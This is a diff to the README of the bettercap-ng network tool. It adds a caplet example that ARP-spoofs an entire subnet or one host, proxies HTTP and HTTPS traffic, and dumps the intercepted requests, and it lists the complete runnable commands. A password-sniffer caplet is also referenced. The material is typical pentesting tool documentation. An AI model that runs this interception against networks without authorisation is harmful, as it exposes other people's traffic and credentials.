@@ -130,6 +130,40 @@ You can have module specific help by using `help module-name` (for instance try 
 
 Interactive sessions can be scripted with `.cap` files, or `caplets`, the following are a few basic examples, look the `caplets` folder for more.
 
+#### caplets/http-req-dump.cap
+
+Execute an ARP spoofing attack on the whole network (by default) or on a host (using `-eval` as described), intercept HTTP and HTTPS requests with the `http.proxy` and `https.proxy` modules and dump them using the `http-req-dump.js` proxy script.
+
+```sh
+# targeting the whole subnet by default, to make it selective:
+#
+#   sudo ./bettercap-ng -caplet caplets/http-req-dump.cap -eval "set arp.spoof.targets 192.168.1.64"
+
+# to make it less verbose
+# events.stream off
+
+# discover a few hosts 
+net.probe on
+sleep 1
+net.probe off
+
+# uncomment to enable sniffing too
+# set net.sniff.verbose false
+# set net.sniff.local true
+# set net.sniff.filter tcp port 443
+# net.sniff on
+
+# we'll use this proxy script to dump requests
+set https.proxy.script caplets/http-req-dump.js
+set http.proxy.script caplets/http-req-dump.js
+clear
+
+# go ^_^
+http.proxy on
+https.proxy on
+arp.spoof on
+```
+
 #### caplets/simple-password-sniffer.cap
 
 Simple password sniffer.
